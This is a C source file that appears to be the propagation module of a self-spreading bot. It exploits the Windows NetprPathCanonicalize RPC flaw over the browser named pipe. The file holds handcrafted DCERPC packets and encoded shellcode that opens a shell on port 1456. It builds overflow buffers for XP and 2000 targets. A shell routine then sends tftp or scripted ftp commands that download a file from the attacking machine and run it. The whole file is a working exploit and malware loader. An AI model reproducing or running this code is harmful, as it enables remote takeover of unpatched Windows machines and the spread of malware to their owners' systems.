#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"


#ifndef NO_NETAPI

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")

// bind uuid interface: 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0
unsigned char DCERPC_Bind_RPC_Service[] =
       "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00"
       "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
       "\xC8\x4F\x32\x4B\x70\x16\xD3\x01\x12\x78\x5A\x47\xBF\x6E\xE1\x88"
       "\x03\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
       "\x2B\x10\x48\x60\x02\x00\x00\x00";

// request windows api: NetprPathCanonicalize (0x1f)
unsigned char DCERPC_Request_RPC_Service[] =
       "\x05\x00\x00\x03\x10\x00\x00\x00\x30\x08\x00\x00\x00\x00\x00\x00"
       "\x18\x08\x00\x00\x00\x00\x1f\x00\xff\xff\xff\xff\x01\x00\x00\x00"
       "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";

       // path ...

unsigned char DCERPC_Request_RPC_Service_[] =
       "\xfa\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
       "\x00\x00\x00\x00\xfa\x00\x00\x00\x00\x00\x00\x00";

unsigned char sc[] =
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7e"
"\xa9\xbc\x52\x83\xeb\xfc\xe2\xf4\x82\xc3\x57\x1f\x96\x50\x43\xad"
"\x81\xc9\x37\x3e\x5a\x8d\x37\x17\x42\x22\xc0\x57\x06\xa8\x53\xd9"
"\x31\xb1\x37\x0d\x5e\xa8\x57\x1b\xf5\x9d\x37\x53\x90\x98\x7c\xcb"
"\xd2\x2d\x7c\x26\x79\x68\x76\x5f\x7f\x6b\x57\xa6\x45\xfd\x98\x7a"
"\x0b\x4c\x37\x0d\x5a\xa8\x57\x34\xf5\xa5\xf7\xd9\x21\xb5\xbd\xb9"
"\x7d\x85\x37\xdb\x12\x8d\xa0\x33\xbd\x98\x67\x36\xf5\xea\x8c\xd9"
"\x3e\xa5\x37\x22\x62\x04\x37\x12\x76\xf7\xd4\xdc\x30\xa7\x50\x02"
"\x81\x7f\xda\x01\x18\xc1\x8f\x60\x16\xde\xcf\x60\x21\xfd\x43\x82"
"\x16\x62\x51\xae\x45\xf9\x43\x84\x21\x20\x59\x34\xff\x44\xb4\x50"
"\x2b\xc3\xbe\xad\xae\xc1\x65\x5b\x8b\x04\xeb\xad\xa8\xfa\xef\x01"
"\x2d\xfa\xff\x01\x3d\xfa\x43\x82\x18\xc1\xb9\xe2\x18\xfa\x35\xb3"
"\xeb\xc1\x18\x48\x0e\x6e\xeb\xad\xa8\xc3\xac\x03\x2b\x56\x6c\x3a"
"\xda\x04\x92\xbb\x29\x56\x6a\x01\x2b\x56\x6c\x3a\x9b\xe0\x3a\x1b"
"\x29\x56\x6a\x02\x2a\xfd\xe9\xad\xae\x3a\xd4\xb5\x07\x6f\xc5\x05"
"\x81\x7f\xe9\xad\xae\xcf\xd6\x36\x18\xc1\xdf\x3f\xf7\x4c\xd6\x02"
"\x27\x80\x70\xdb\x99\xc3\xf8\xdb\x9c\x98\x7c\xa1\xd4\x57\xfe\x7f"
"\x80\xeb\x90\xc1\xf3\xd3\x84\xf9\xd5\x02\xd4\x20\x80\x1a\xaa\xad"
"\x0b\xed\x43\x84\x25\xfe\xee\x03\x2f\xf8\xd6\x53\x2f\xf8\xe9\x03"
"\x81\x79\xd4\xff\xa7\xac\x72\x01\x81\x7f\xd6\xad\x81\x9e\x43\x82"
"\xf5\xfe\x40\xd1\xba\xcd\x43\x84\x2c\x56\x6c\x3a\x8e\x23\xb8\x0d"
"\x2d\x56\x6a\xad\xae\xa9\xbc\x52";






bool XConnectShell(EXINFO exinfo, int bindport) {

int len;
char recvbuf[1024];
SOCKET sockfd;
SOCKADDR_IN shell_addr;
memset(&shell_addr, 0, sizeof(shell_addr));


shell_addr.sin_family = AF_INET;
shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
shell_addr.sin_port = fhtons(bindport);

if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
return FALSE;
if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR)
return FALSE;

char mkdir_buff[400];

len = frecv(sockfd, recvbuf, 1024, 0);
#ifndef NO_TFTPD
_snprintf(mkdir_buff, sizeof (mkdir_buff),
"tftp -i %s get %s\r\n",
GetIP( exinfo.sock ),filename, filename);
#endif
#ifndef NO_FTPD
_snprintf(mkdir_buff, sizeof (mkdir_buff),
"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &%s\r\n", GetIP(exinfo.sock), FTP_PORT, filename, filename);
#endif
if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
return FALSE;

Sleep(500);
_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
return FALSE;
len = frecv(sockfd, recvbuf, 1024, 0);

fclosesocket(sockfd);
return TRUE;

}


BOOL netapi2XP(EXINFO exinfo)
{
    HANDLE hFile;
       NETRESOURCE nr;

       char szRemoteName[MAX_PATH], szPipePath[MAX_PATH];

       unsigned int i;

       unsigned char szInBuf[4096];
       unsigned long dwRead, nWritten;

       unsigned char szReqBuf[2096];

       memset(szReqBuf, 0, sizeof(szReqBuf));

       if (2 == 1) {
               unsigned char szBuff[1064];

               // build payload buffer
               memset(szBuff, '\x90', 1000);
               memcpy(szBuff+630, sc, sizeof(sc));

               for(i=1000; i<1064; i+=4) {
                       memcpy(szBuff+i, "\x04\x08\x02\x00", 4);
               }

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x15\x02\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x15\x02\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+1120, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+1124, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
               memcpy(szReqBuf+1140 , "\xeb\x02", 2);
       }
       if (2 == 2) {
               unsigned char szBuff[708];

               memset(szBuff, '\x90', 612); /* size of shellcode */
               memcpy(szBuff, sc, sizeof(sc));

               memcpy(szBuff+612, "\x0a\x08\x02\x00", 4);
               memset(szBuff+616, 'A', 8); // 8 bytes padding
               memcpy(szBuff+624, "\x04\x08\x02\x00", 4);
               memset(szBuff+628, '\x90', 32);
               memcpy(szBuff+660, "\x04\x08\x02\x00", 4);
               memset(szBuff+664, 'B', 8); // 8 bytes padding
               memcpy(szBuff+672, "\x04\x08\x02\x00", 4);
               memset(szBuff+676, '\x90', 32);

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x63\x01\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x63\x01\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+764, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+768, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
       }

//       printf("[+] Connecting to %s ... \n", argv[1]);

       _snprintf(szRemoteName, sizeof(szRemoteName), "\\%s\\ipc$", exinfo.ip);
       nr.dwType = RESOURCETYPE_ANY;
       nr.lpLocalName = NULL;
       nr.lpProvider = NULL;
       nr.lpRemoteName = szRemoteName;
       if (WNetAddConnection2(&nr, "", "", 0) != NO_ERROR) {
               printf("[-] Failed to connect to host !\n");
               return FALSE;
       }

       _snprintf(szPipePath, sizeof(szPipePath), "\\%s\\pipe\\browser", exinfo.ip);
       hFile = CreateFile(szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

       if (hFile == INVALID_HANDLE_VALUE) {
//               printf("[-] Failed to open named pipe !\n");
               return FALSE;
       }

       printf("[+] Binding to RPC interface ... \n");
       if (TransactNamedPipe(hFile, DCERPC_Bind_RPC_Service, sizeof(DCERPC_Bind_RPC_Service), szInBuf, sizeof(szInBuf), &dwRead, NULL) == 0) {
//               printf("[-] Failed to bind to interface !\n");
               CloseHandle(hFile);
               return FALSE;
       }

//       printf("[+] Sending RPC request ... \n");
       if (!WriteFile(hFile, szReqBuf, sizeof(szReqBuf), &nWritten, 0)) {
//               printf("[-] Unable to transmit RPC request !\n");
               CloseHandle(hFile);
               return FALSE;
       }
Sleep(250);
if (XConnectShell(exinfo,1456))
{
exploit[exinfo.exploit].stats++;
return TRUE;
}
return FALSE;
}

BOOL netapi22K(EXINFO exinfo)
{
    HANDLE hFile;
       NETRESOURCE nr;

       char szRemoteName[MAX_PATH], szPipePath[MAX_PATH];

       unsigned int i;

       unsigned char szInBuf[4096];
       unsigned long dwRead, nWritten;

       unsigned char szReqBuf[2096];

       memset(szReqBuf, 0, sizeof(szReqBuf));

       if (1 == 1) {
               unsigned char szBuff[1064];

               // build payload buffer
               memset(szBuff, '\x90', 1000);
               memcpy(szBuff+630, sc, sizeof(sc));

               for(i=1000; i<1064; i+=4) {
                       memcpy(szBuff+i, "\x04\x08\x02\x00", 4);
               }

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x15\x02\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x15\x02\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+1120, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+1124, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
               memcpy(szReqBuf+1140 , "\xeb\x02", 2);
       }
       if (1 == 2) {
               unsigned char szBuff[708];

               memset(szBuff, '\x90', 612); /* size of shellcode */
               memcpy(szBuff, sc, sizeof(sc));

               memcpy(szBuff+612, "\x0a\x08\x02\x00", 4);
               memset(szBuff+616, 'A', 8); // 8 bytes padding
               memcpy(szBuff+624, "\x04\x08\x02\x00", 4);
               memset(szBuff+628, '\x90', 32);
               memcpy(szBuff+660, "\x04\x08\x02\x00", 4);
               memset(szBuff+664, 'B', 8); // 8 bytes padding
               memcpy(szBuff+672, "\x04\x08\x02\x00", 4);
               memset(szBuff+676, '\x90', 32);

               // build request buffer
               memcpy(szReqBuf, DCERPC_Request_RPC_Service, sizeof(DCERPC_Request_RPC_Service)-1);
               memcpy(szReqBuf+44, "\x63\x01\x00\x00", 4); /* max count */
               memcpy(szReqBuf+48, "\x00\x00\x00\x00", 4); /* offset */
               memcpy(szReqBuf+52, "\x63\x01\x00\x00", 4); /* actual count */
               memcpy(szReqBuf+56, szBuff, sizeof(szBuff));
               memcpy(szReqBuf+764, "\x00\x00\x00\x00", 4); /* align string */
               memcpy(szReqBuf+768, DCERPC_Request_RPC_Service_, sizeof(DCERPC_Request_RPC_Service_)-1);
       }

//       printf("[+] Connecting to %s ... \n", argv[1]);

       _snprintf(szRemoteName, sizeof(szRemoteName), "\\%s\\ipc$", exinfo.ip);
       nr.dwType = RESOURCETYPE_ANY;
       nr.lpLocalName = NULL;
       nr.lpProvider = NULL;
       nr.lpRemoteName = szRemoteName;
       if (WNetAddConnection2(&nr, "", "", 0) != NO_ERROR) {
               printf("[-] Failed to connect to host !\n");
               return FALSE;
       }

       _snprintf(szPipePath, sizeof(szPipePath), "\\%s\\pipe\\browser", exinfo.ip);
       hFile = CreateFile(szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

       if (hFile == INVALID_HANDLE_VALUE) {
//               printf("[-] Failed to open named pipe !\n");
               return FALSE;
       }

       printf("[+] Binding to RPC interface ... \n");
       if (TransactNamedPipe(hFile, DCERPC_Bind_RPC_Service, sizeof(DCERPC_Bind_RPC_Service), szInBuf, sizeof(szInBuf), &dwRead, NULL) == 0) {
//               printf("[-] Failed to bind to interface !\n");
               CloseHandle(hFile);
               return FALSE;
       }

//       printf("[+] Sending RPC request ... \n");
       if (!WriteFile(hFile, szReqBuf, sizeof(szReqBuf), &nWritten, 0)) {
//               printf("[-] Unable to transmit RPC request !\n");
               CloseHandle(hFile);
               return FALSE;
       }
Sleep(250);
if (XConnectShell(exinfo,1456))
{
exploit[exinfo.exploit].stats++;
return TRUE;
}
return FALSE;
}

//BOOL netapi2(char *target, void* conn,EXINFO exinfo)
BOOL netapi2(EXINFO exinfo)
{
if(!netapi2XP(exinfo))
{
if(!netapi2XP(exinfo))
{
return FALSE;
}
return TRUE;
}
return TRUE;
}


#endif